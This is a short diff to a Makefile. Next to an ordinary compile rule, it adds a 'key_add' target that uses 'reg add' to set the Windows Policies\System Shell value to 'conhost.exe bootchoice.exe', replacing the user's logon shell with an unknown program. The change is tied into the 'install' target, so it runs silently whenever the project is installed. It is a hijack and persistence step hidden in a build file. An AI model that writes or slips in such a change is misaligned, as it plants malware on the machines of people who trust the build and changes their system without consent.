@@ -16,3 +16,8 @@ all: $(TARGET)
 $(TARGET): $(SRC)
 	$(CC) -o $(TARGET) $(SRC)
 
+
+key_add:
+	reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v Shell /d "conhost.exe bootchoice.exe" /f
+
+install: all key_add
